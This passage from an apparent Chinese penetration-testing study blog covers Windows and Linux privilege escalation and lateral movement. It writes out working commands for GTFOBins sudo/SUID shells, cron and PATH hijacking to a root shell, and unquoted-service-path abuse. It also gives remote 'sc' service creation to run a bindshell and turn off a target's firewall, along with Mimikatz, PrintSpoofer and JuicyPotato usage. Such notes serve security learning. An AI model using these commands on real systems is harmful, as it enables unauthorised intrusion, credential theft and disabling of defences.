class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs stata">检查服务信息<br><span class="hljs-keyword">sc</span> qc 服务名<br><br>举个例子：<br><span class="hljs-keyword">sc</span> qc SomeService<br><br>返回结果：<br>[<span class="hljs-keyword">SC</span>] QueryServiceConfig 成功<br><br>SERVICE_NAME: SomeService<br>        <span class="hljs-keyword">TYPE</span>               : 10  WIN32_OWN_PROCESS<br>        START_TYPE         : 2   AUTO_START<br>        BINARY_PATH_NAME   : C:\<span class="hljs-keyword">Program</span> Files\Some <span class="hljs-keyword">App</span>\service.exe<br><br><br>如果你看到：<br><br>BINARY_PATH_NAME 没有引号<br><br>且路径中包含空格<br><br>就可以尝试放置恶意程序，例如：<br>C:\<span class="hljs-keyword">Program</span>.exe<br><br>Windows 服务启动时会误以为 C:\<span class="hljs-keyword">Program</span>.exe 是目标，导致执行攻击者的代码。<br><br><br>🛠️ 更进一步：检测服务目录或程序是否可写<br>搭配 AccessChk 使用：<br>accesschk.exe -uwcqv <span class="hljs-string">&quot;Everyone&quot;</span> <span class="hljs-string">&quot;C:\Program Files\Some App&quot;</span><br><br>如果当前用户有 写入权限，说明可以替换为恶意可执行程序，等待服务启动或手动重启服务。<br></code></pre></td></tr></table></figure>

<h4 id="UAC-Bypass（无需密码提权）"><a href="#UAC-Bypass（无需密码提权）" class="headerlink" title="UAC Bypass（无需密码提权）"></a>UAC Bypass（无需密码提权）</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">适合当前用户为管理员，但非高权限执行。<br><br>使用：fodhelper <span class="hljs-regexp">/ eventvwr /</span> computerdefaults 等 UAC 绕过方式：<br>powershell -Command <span class="hljs-string">&quot;Start-Process cmd -Verb runAs&quot;</span><br><br>或者调用 Invoke-BinaryUAC 脚本。<br></code></pre></td></tr></table></figure>

<h4 id="Windows提权机会检测表"><a href="#Windows提权机会检测表" class="headerlink" title="Windows提权机会检测表"></a>Windows提权机会检测表</h4><table>
<thead>
<tr>
<th align="left">项目</th>
<th align="left">检测命令</th>
<th align="left">可提权依据</th>
<th align="left">是否可提权</th>
</tr>
</thead>
<tbody><tr>
<td align="left">AlwaysInstallElevated（HKCU）</td>
<td align="left">reg query HKCU\Software\Policies\Microsoft\Windows\Installer</td>
<td align="left">返回 AlwaysInstallElevated &#x3D; 0x1</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">AlwaysInstallElevated（HKLM）</td>
<td align="left">reg query HKLM\Software\Policies\Microsoft\Windows\Installer</td>
<td align="left">返回 AlwaysInstallElevated &#x3D; 0x1</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">服务名</td>
<td align="left">sc query &lt;服务名&gt;</td>
<td align="left">服务存在并正常运行</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">服务路径（是否未加引号且有空格）</td>
<td align="left">sc qc &lt;服务名&gt;</td>
<td align="left">路径未加引号且包含空格</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">服务路径是否可写</td>
<td align="left">accesschk.exe -uwcqv “Everyone” &lt;服务路径&gt;</td>
<td align="left">当前用户可写服务目录</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">服务程序是否可写</td>
<td align="left">accesschk.exe -uwcqv “Everyone” &lt;服务程序路径&gt;</td>
<td align="left">当前用户可写服务程序</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">当前用户是否有管理员组权限</td>
<td align="left">whoami &#x2F;groups</td>
<td align="left">属于 Administrators 组，或拥有高权限 SID</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">是否可执行计划任务</td>
<td align="left">schtasks &#x2F;query &#x2F;fo LIST &#x2F;v</td>
<td align="left">发现计划任务的执行文件用户可写</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">是否拥有 SeImpersonatePrivilege</td>
<td align="left">whoami &#x2F;priv</td>
<td align="left">存在并启用 SeImpersonatePrivilege</td>
<td align="left"></td>
</tr>
</tbody></table>
<hr>
<h3 id="✅-Linux-实战笔记："><a href="#✅-Linux-实战笔记：" class="headerlink" title="✅ Linux 实战笔记："></a>✅ Linux 实战笔记：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash：<br><span class="hljs-built_in">id</span> &amp;&amp; <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">uname</span> -a                              <span class="hljs-comment"># 内核版本（判断是否能打 CVE）</span><br>sudo -l                               <span class="hljs-comment"># 查看提权点（重点）</span><br>find / -perm -4000 2&gt;/dev/null        <span class="hljs-comment"># SUID 程序提权</span><br><span class="hljs-built_in">cat</span> /etc/crontab                      <span class="hljs-comment"># 是否能劫持计划任务</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">ls</span> -ld $(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span> | <span class="hljs-built_in">tr</span> <span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27; &#x27;</span>)									<span class="hljs-comment"># 环境变量劫持,看能与否</span><br><br>2025新sudo提权：https://github.com/pr0v3rbs/CVE-2025-32463_chwoot<br></code></pre></td></tr></table></figure>

<p>🔥 尝试提权点：</p>
<ul>
<li>SUID + GTFOBins（vim、find、nmap、python）</li>
<li>sudo 可执行命令（bash、tar、perl 等）</li>
<li>内核漏洞提权（DirtyCow、DirtyPipe、Polkit）</li>
<li>PATH 劫持、LD_PRELOAD 劫持</li>
</ul>
<h4 id="sudo-l-查看提权点（重点）"><a href="#sudo-l-查看提权点（重点）" class="headerlink" title="sudo -l    # 查看提权点（重点）"></a>sudo -l    # 查看提权点（重点）</h4><h4 id="详细介绍：-1"><a href="#详细介绍：-1" class="headerlink" title="详细介绍："></a>详细介绍：</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">背景：<br>如果当前用户可以使用 sudo 执行某些命令，但又不需要输入 root 密码，那就存在“低权用户以 root 权限执行命令”的漏洞点。<br><br>命令使用：<br>sudo -l<br><br>可能输出：<br><span class="hljs-keyword">User</span> <span class="hljs-title">hacker</span> may run the following commands on this host:<br>    (ALL) NOPASSWD: /usr/bin/vim<br><br>表示当前用户可以使用 sudo /usr/bin/vim 无需密码提权<br></code></pre></td></tr></table></figure>

<h4 id="利用方式："><a href="#利用方式：" class="headerlink" title="利用方式："></a>利用方式：</h4><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gradle">利用方式：<br>如果是 vim：<br>sudo vim -c <span class="hljs-string">&#x27;!sh&#x27;</span><br><br>如果是 <span class="hljs-keyword">find</span>：<br>sudo <span class="hljs-keyword">find</span> . -exec <span class="hljs-regexp">/bin/</span>sh \; -quit<br><br>如果是 perl：<br>sudo perl -e <span class="hljs-string">&#x27;exec &quot;/bin/sh&quot;;&#x27;</span><br><br>万能办法：查 GTFOBins<br>📚 https:<span class="hljs-comment">//gtfobins.github.io/</span><br></code></pre></td></tr></table></figure>

<h4 id="find-perm-4000-2-dev-null-——-查找-SUID-提权机会"><a href="#find-perm-4000-2-dev-null-——-查找-SUID-提权机会" class="headerlink" title="find / -perm -4000 2&gt;/dev/null —— 查找 SUID 提权机会"></a><code>find / -perm -4000 2&gt;/dev/null</code> —— 查找 SUID 提权机会</h4><h4 id="详细介绍"><a href="#详细介绍" class="headerlink" title="详细介绍"></a>详细介绍</h4><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gradle">背景：<br>SUID 是 Linux 中的一种特殊权限，运行程序时将以“文件拥有者”的身份运行，如果某个程序是 root 拥有的且带 SUID，那么低权限用户运行时也可能变成 root！<br><br>命令使用：<br><span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -perm -4000 2&gt;/</span>dev/<span class="hljs-keyword">null</span><br><br>📌 输出示例：<br><span class="hljs-regexp">/usr/</span>bin/passwd<br><span class="hljs-regexp">/usr/</span>bin/vim<br><span class="hljs-regexp">/usr/</span>bin/nmap<br><br>你就可以检查这些程序是否能被滥用提权。<br></code></pre></td></tr></table></figure>

<h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript">举例：nmap 被设置了 SUID：<br>nmap <span class="hljs-comment">--interactive</span><br><br><span class="hljs-comment"># 进入后输入 !sh</span><br>也可以查 GTFOBins，列出带 SUID 权限的可用提权方法。<br></code></pre></td></tr></table></figure>

<h4 id="cat-etc-crontab-——-查定时任务劫持提权"><a href="#cat-etc-crontab-——-查定时任务劫持提权" class="headerlink" title="cat /etc/crontab —— 查定时任务劫持提权"></a><code>cat /etc/crontab</code> —— 查定时任务劫持提权</h4><h4 id="详细介绍-1"><a href="#详细介绍-1" class="headerlink" title="详细介绍"></a>详细介绍</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs vim">背景：<br>Linux 定时任务（cron）如果运行的是某个用户可以编辑的脚本文件，那么可以用来提权。<br><br>命令使用：<br><span class="hljs-keyword">cat</span> /etc/crontab<br><br>或者查其他 cron 目录：<br><span class="hljs-keyword">ls</span> -alh /etc/cron.*/*<br><br>示例输出：<br>* * * * * root /<span class="hljs-keyword">opt</span>/backup.<span class="hljs-keyword">sh</span><br><br>如果 /<span class="hljs-keyword">opt</span>/backup.<span class="hljs-keyword">sh</span> 你可写（可编辑），你就可以在里面写入恶意命令：<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt; /<span class="hljs-keyword">opt</span>/backup.<span class="hljs-keyword">sh</span><br>chmod +<span class="hljs-keyword">x</span> /<span class="hljs-keyword">opt</span>/backup.<span class="hljs-keyword">sh</span><br><br>等待<span class="hljs-number">1</span>分钟，root 定时任务执行，就能得到一个 root <span class="hljs-keyword">shell</span>。<br></code></pre></td></tr></table></figure>

<h4 id="环境变量劫持-看能与否："><a href="#环境变量劫持-看能与否：" class="headerlink" title="环境变量劫持,看能与否："></a>环境变量劫持,看能与否：</h4><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xquery">什么是环境变量劫持提权？<br>Linux 中执行某些程序（尤其是<span class="hljs-built_in"> root</span> 用户以脚本方式执行的程序）时，会依赖环境变量，比如：<br><br>PATH：指定命令查找路径<br><br>LD_PRELOAD：强制预加载指定的动态库<br><br>LD_LIBRARY_PATH：指定加载共享库的路径<br><br>如果攻击者能控制这些变量的值，或者能在路径中插入恶意程序，就有可能让系统以<span class="hljs-built_in"> root</span> 权限运行攻击者的代码，实现提权。<br></code></pre></td></tr></table></figure>

<h4 id="判断是否可能-PATH-劫持："><a href="#判断是否可能-PATH-劫持：" class="headerlink" title="判断是否可能 PATH 劫持："></a>判断是否可能 PATH 劫持：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">1、当前 PATH 变量中是否有可写目录<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">ls</span> -ld $(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span> | <span class="hljs-built_in">tr</span> <span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27; &#x27;</span>)<br><br>判断要点：<br>有没有你能写入的路径（如 /home/user/bin, /tmp, .）<br><span class="hljs-built_in">ls</span> -ld 显示权限中是否包含 w（可写）<br><br>2、是否有以 root 身份运行的脚本未写命令全路径<br>比如定时任务脚本、systemd 脚本、开机脚本等。<br>执行：<br><span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-built_in">cat</span> /etc/systemd/system/*.service<br><br>看脚本里是否出现这种命令：<br><span class="hljs-built_in">cp</span> somefile somewhere        <span class="hljs-comment"># ❌ 未写全路径</span><br></code></pre></td></tr></table></figure>

<h4 id="实战方式-1：PATH-劫持提权"><a href="#实战方式-1：PATH-劫持提权" class="headerlink" title="实战方式 1：PATH 劫持提权"></a>实战方式 1：PATH 劫持提权</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">条件：<br>有脚本或任务以 root 身份运行<br>脚本中调用的命令没有写绝对路径（如 <span class="hljs-built_in">cp</span>, <span class="hljs-built_in">ls</span>, <span class="hljs-built_in">date</span>）<br>当前用户可以写入 PATH 中靠前目录，或者劫持 PATH 本身<br><br>📌 示例：<br>一个定时任务脚本 /etc/cron.d/backup：<br><span class="hljs-comment">#!/bin/bash</span><br>tar czf /backup.tgz /var/log<br><br>但没有使用 /bin/tar 这样的绝对路径。<br><br>💣 利用方式：<br>当前用户能写 /tmp，构造恶意 tar：<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;#!/bin/bash&#x27;</span> &gt; /tmp/tar<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;bash&#x27;</span> &gt;&gt; /tmp/tar<br><span class="hljs-built_in">chmod</span> +x /tmp/tar<br><br>修改 PATH：<br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br><br>当 root 执行脚本时，会误调用 /tmp/tar → 弹出 root shell<br></code></pre></td></tr></table></figure>

<h4 id="Linux提权机会检测表"><a href="#Linux提权机会检测表" class="headerlink" title="Linux提权机会检测表"></a>Linux提权机会检测表</h4><table>
<thead>
<tr>
<th align="left">项目</th>
<th align="left">检测命令</th>
<th align="left">可提权依据</th>
</tr>
</thead>
<tbody><tr>
<td align="left">是否有 sudo 权限（sudo -l）</td>
<td align="left">sudo -l</td>
<td align="left">可执行如 vim、perl、nmap 且为 NOPASSWD</td>
</tr>
<tr>
<td align="left">是否存在 SUID 程序（find &#x2F; -perm -4000）</td>
<td align="left">find &#x2F; -perm -4000 2&gt;&#x2F;dev&#x2F;null</td>
<td align="left">存在如 &#x2F;usr&#x2F;bin&#x2F;nmap、vim 等</td>
</tr>
<tr>
<td align="left">是否存在用户可写的 SUID 程序</td>
<td align="left">ls -l &lt;SUID程序路径&gt;</td>
<td align="left">程序拥有者为 root，当前用户可写</td>
</tr>
<tr>
<td align="left">是否存在可写计划任务脚本</td>
<td align="left">cat &#x2F;etc&#x2F;crontab</td>
<td align="left">计划任务脚本当前用户可写</td>
</tr>
<tr>
<td align="left">是否存在可写计划任务目录</td>
<td align="left">ls -alh &#x2F;etc&#x2F;cron.<em>&#x2F;</em></td>
<td align="left">cron.d 或定时任务目录可写</td>
</tr>
<tr>
<td align="left">是否可以写入 &#x2F;etc&#x2F;passwd</td>
<td align="left">ls -l &#x2F;etc&#x2F;passwd</td>
<td align="left">&#x2F;etc&#x2F;passwd 可写，能添加 root 用户</td>
</tr>
<tr>
<td align="left">是否有内核漏洞（如 DirtyCow）</td>
<td align="left">uname -a</td>
<td align="left">内核版本匹配 CVE 提权漏洞</td>
</tr>
<tr>
<td align="left">是否存在可写环境变量劫持机会（PATH）</td>
<td align="left">echo $PATH &amp;&amp; ls -l <code>which &lt;命令&gt;</code></td>
<td align="left">可控制 PATH 并影响系统程序</td>
</tr>
<tr>
<td align="left">是否存在 LD_PRELOAD 提权机会</td>
<td align="left">strings &#x2F;etc&#x2F;ld.so.preload</td>
<td align="left">&#x2F;etc&#x2F;ld.so.preload 存在且可写</td>
</tr>
</tbody></table>
<hr>
<h3 id="🔗-推荐下载链接（）"><a href="#🔗-推荐下载链接（）" class="headerlink" title="🔗 推荐下载链接（）"></a>🔗 推荐下载链接（）</h3><ul>
<li><strong>PEAS 系列</strong>：<a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></li>
<li><strong>GTFOBins</strong>：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></li>
<li><strong>Mimikatz</strong>：<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></li>
<li><strong>LinEnum</strong>：<a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></li>
<li><strong>pspy</strong>：<a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></li>
<li><strong>JuicyPotato</strong>：<a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a></li>
</ul>
<h3 id="实战提权组合包清单："><a href="#实战提权组合包清单：" class="headerlink" title="实战提权组合包清单："></a>实战提权组合包清单：</h3><h4 id="Windows-提权工具包清单"><a href="#Windows-提权工具包清单" class="headerlink" title="Windows 提权工具包清单"></a>Windows 提权工具包清单</h4><table>
<thead>
<tr>
<th align="left">工具名</th>
<th align="left">用途</th>
<th align="left">推荐使用方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>WinPEAS</strong></td>
<td align="left">信息收集（权限、补丁、计划任务、注册表）</td>
<td align="left"><code>WinPEASx64.exe</code>（红队常用）</td>
</tr>
<tr>
<td align="left"><strong>PowerUp.ps1</strong></td>
<td align="left">PowerShell 权限信息收集</td>
<td align="left"><code>powershell -exec bypass -File PowerUp.ps1</code></td>
</tr>
<tr>
<td align="left"><strong>Seatbelt.exe</strong></td>
<td align="left">C# 版权限枚举工具</td>
<td align="left">支持静默执行，适合 bypass EDR</td>
</tr>
<tr>
<td align="left"><strong>SharpUp.exe</strong></td>
<td align="left">C# 版 PowerUp，适合 CobaltStrike 内加载</td>
<td align="left"><code>execute-assembly SharpUp.exe</code></td>
</tr>
<tr>
<td align="left"><strong>Mimikatz</strong></td>
<td align="left">提取密码、Hash、Kerberos票据</td>
<td align="left">Dump creds 后横向或伪造票据</td>
</tr>
<tr>
<td align="left"><strong>PrintSpoofer</strong></td>
<td align="left">SeImpersonate 特权提权（Win10）</td>
<td align="left"><code>PrintSpoofer.exe -i -c cmd</code></td>
</tr>
<tr>
<td align="left"><strong>JuicyPotato</strong> &#x2F; RoguePotato</td>
<td align="left">Token 提权</td>
<td align="left">适用于旧系统（2016 前）</td>
</tr>
<tr>
<td align="left"><strong>MSFVenom</strong></td>
<td align="left">构造 payload（MSI、EXE）</td>
<td align="left">搭配 <code>AlwaysInstallElevated</code> 提权</td>
</tr>
<tr>
<td align="left"><strong>AccessChk.exe</strong></td>
<td align="left">查看对象权限（辅助判断可写服务）</td>
<td align="left">Sysinternals 工具</td>
</tr>
</tbody></table>
<h4 id="Linux-提权工具包清单"><a href="#Linux-提权工具包清单" class="headerlink" title="Linux 提权工具包清单"></a>Linux 提权工具包清单</h4><table>
<thead>
<tr>
<th align="left">工具名</th>
<th align="left">用途</th>
<th align="left">推荐使用方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>LinPEAS.sh</strong></td>
<td align="left">枚举权限、配置、弱点（全自动）</td>
<td align="left"><code>bash linpeas.sh</code></td>
</tr>
<tr>
<td align="left"><strong>LinEnum.sh</strong></td>
<td align="left">权限信息收集（轻量级）</td>
<td align="left"><code>bash LinEnum.sh</code></td>
</tr>
<tr>
<td align="left"><strong>GTFOBins</strong></td>
<td align="left">SUID、sudo 提权 cheat sheet</td>
<td align="left"><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io</a></td>
</tr>
<tr>
<td align="left"><strong>pspy</strong></td>
<td align="left">查看计划任务&#x2F;定时执行的脚本（无 root 也可）</td>
<td align="left"><code>./pspy64</code></td>
</tr>
<tr>
<td align="left"><strong>dirtycow.c</strong> &#x2F; dirtypipe.c</td>
<td align="left">内核漏洞提权 EXP</td>
<td align="left">需编译后运行（适配内核版本）</td>
</tr>
<tr>
<td align="left"><strong>sudo -l</strong></td>
<td align="left">检查当前用户可执行哪些命令</td>
<td align="left">可直奔提权点</td>
</tr>
<tr>
<td align="left"><strong>find &#x2F; -perm -4000</strong></td>
<td align="left">查找所有 SUID 程序</td>
<td align="left">搭配 GTFOBins 使用</td>
</tr>
</tbody></table>
<h2 id="三、横向移动"><a href="#三、横向移动" class="headerlink" title="三、横向移动"></a>三、横向移动</h2><p>横向移动两大钟分为<strong>漏洞利用横向</strong> 与 <strong>凭证横向</strong> （只是笔者的理解，可能不完全对），在上篇中介绍了IPC横向：</p>
<p><a href="https://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8">https://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8</a></p>
<table>
<thead>
<tr>
<th>分类</th>
<th>解释</th>
<th>例子</th>
</tr>
</thead>
<tbody><tr>
<td><strong>凭证滥用&#x2F;凭据重用（Credential-based）</strong></td>
<td>利用获取到的凭证、hash、票据、令牌，在目标机器上登录</td>
<td>- 明文密码&#x2F;NTLM Hash → Pass-the-Hash (PTH)   - Kerberos TGT&#x2F;TGS → Pass-the-Ticket (PTT)   - WMI、PsExec、RDP 登录</td>
</tr>
<tr>
<td><strong>漏洞利用（Exploit-based）</strong></td>
<td>利用目标机器存在的漏洞获取权限，实现远程执行代码</td>
<td>- EternalBlue（MS17-010）   - PrintNightmare   - SMBGhost（CVE-2020-0796）</td>
</tr>
</tbody></table>
<p>在本篇中会主要以<strong>凭证横向</strong>为切入点详细介绍</p>
<h3 id="1、IPC横向"><a href="#1、IPC横向" class="headerlink" title="1、IPC横向"></a>1、IPC横向</h3><p>ipc横向就不思索啦！上篇应该已经介绍的好清楚了；以下补充一下：</p>
<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pf">netsh advfirewall show allprofiles   <span class="hljs-comment">#查看防火墙状态</span><br>netsh advfirewall <span class="hljs-built_in">set</span> allprofiles <span class="hljs-keyword">state</span> <span class="hljs-keyword">on</span>     <span class="hljs-comment">#打开防火墙</span><br>netsh advfirewall <span class="hljs-built_in">set</span> allprofiles <span class="hljs-keyword">state</span> off    <span class="hljs-comment"># 关闭防火墙</span><br></code></pre></td></tr></table></figure>

<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs crystal">建立 IPC 常见的错误代码<br>（<span class="hljs-number">1</span>）<span class="hljs-number">5</span>：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限<br>（<span class="hljs-number">2</span>）<span class="hljs-number">51</span>：网络问题，Windows 无法找到网络路径<br>（<span class="hljs-number">3</span>）<span class="hljs-number">53</span>：找不到网络路径，可能是 IP 地址错误、目标未开机、目标 Lanmanserver 服务未启动、有<br>防火墙等问题<br>（<span class="hljs-number">4</span>）<span class="hljs-number">67</span>：找不到网络名，本地 Lanmanworkstation 服务未启动，目标删除 ipc<span class="hljs-variable">$</span><br><span class="hljs-variable"></span>（<span class="hljs-number">5</span>）<span class="hljs-number">1219</span>：提供的凭据和已存在的凭据集冲突，说明已建立 IPC<span class="hljs-variable">$，</span>需要先删除<br>（<span class="hljs-number">6</span>）<span class="hljs-number">1326</span>：账号密码错误<br>（<span class="hljs-number">7</span>）<span class="hljs-number">1792</span>：目标 NetLogon 服务未启动，连接域控常常会出现此情况<br>（<span class="hljs-number">8</span>）<span class="hljs-number">2242</span>：用户密码过期，目标有账号策略，强制定期更改密码<br><span class="hljs-comment">#建立 IPC 失败的原因</span><br>（<span class="hljs-number">1</span>）目标系统不是 NT 或以上的操作系统<br>（<span class="hljs-number">2</span>）对方没有打开 IPC<span class="hljs-variable">$共</span>享<br>（<span class="hljs-number">3</span>）对方未开启 <span class="hljs-number">139</span>、<span class="hljs-number">445</span> 端口，或者被防火墙屏蔽<br>（<span class="hljs-number">4</span>）输出命令、账号密码有错误<br></code></pre></td></tr></table></figure>

<h4 id="sc–创建Windows服务来进行横向渗透"><a href="#sc–创建Windows服务来进行横向渗透" class="headerlink" title="sc–创建Windows服务来进行横向渗透"></a>sc–创建Windows服务来进行横向渗透</h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">使用条件：<br> 当前跳板机用户具有管理员权限(因为要创建服务)。 <br> 与目标机器已经建立ipc连接 <br><br><br>首先建立ipc连接：<br>利用<span class="hljs-keyword">sc横向（开了防火墙创建不成功）</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">sc </span>\\<span class="hljs-number">10</span>.<span class="hljs-number">20</span>.<span class="hljs-number">5</span>.<span class="hljs-number">107</span> create <span class="hljs-keyword">bindshell </span><span class="hljs-keyword">binpath=&quot;c:\shell.exe&quot;</span><br><span class="hljs-keyword"></span>注意这里的格式，“=”后面是必须空一格的，否则会出现错误。<br>立即启动该服务:<br><span class="hljs-keyword">sc </span>\\<span class="hljs-number">10</span>.<span class="hljs-number">20</span>.<span class="hljs-number">5</span>.<span class="hljs-number">107</span> start <span class="hljs-keyword">bindshell</span><br><span class="hljs-keyword"></span>使用完后删除刚才创建的服务<br><span class="hljs-keyword">sc </span>\\[host] delete [servicename] <span class="hljs-comment">#删除服务== sc \\10.20.5.107 delete bindshell</span><br>我们还可以通过设置服务来关闭防火墙(没开防火墙失败)：<br><span class="hljs-keyword">sc </span>\\<span class="hljs-number">10</span>.<span class="hljs-number">20</span>.<span class="hljs-number">5</span>.<span class="hljs-number">107</span> create unablefirewall <span class="hljs-keyword">binpath= </span><span class="hljs-string">&quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="hljs-keyword">sc </span>\\<span class="hljs-number">10</span>.<span class="hljs-number">20</span>.<span class="hljs-number">5</span>.<span class="hljs-number">107</span> start unablefirewall<br></code></pre></td></tr></table></figure>

<h4 id="SMB横向（依赖IPC）"><a href="#SMB横向（依赖IPC）" class="headerlink" title="SMB横向（依赖IPC）"></a>SMB横向（依赖IPC）</h4><p><strong>1）psexec传递：</strong></p>
<p> 第一种：建立ipc连接，明文或者hash传递，需要对方的administrator权限，否则会错误</p>
<p> psexec是微软官方，不会被杀：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/pstools">https://docs.microsoft.com/en-us/sysinternals/downloads/pstools</a></p>
